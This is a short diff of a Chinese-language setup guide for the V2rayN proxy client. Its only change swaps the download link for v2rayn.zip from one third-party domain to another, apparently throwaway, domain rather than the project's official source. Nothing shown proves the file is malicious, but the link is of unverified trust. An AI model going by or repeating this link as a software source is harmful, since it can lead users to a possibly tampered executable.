@@ -11,7 +11,7 @@ V2rayN 要求系统安装有 [Microsoft .NET Framework 4.8](https://dotnet.micro
 应用下载
 ----
 
-以下是各平台该应用的下载地址。 **下载链接：** [点击下载软件](https://d1.wenxin-ai.top/v2rayn.zip)
+以下是各平台该应用的下载地址。 **下载链接：** [点击下载软件](https://d1.88888811.xyz/v2rayn.zip)
 
 获取订阅
 ----
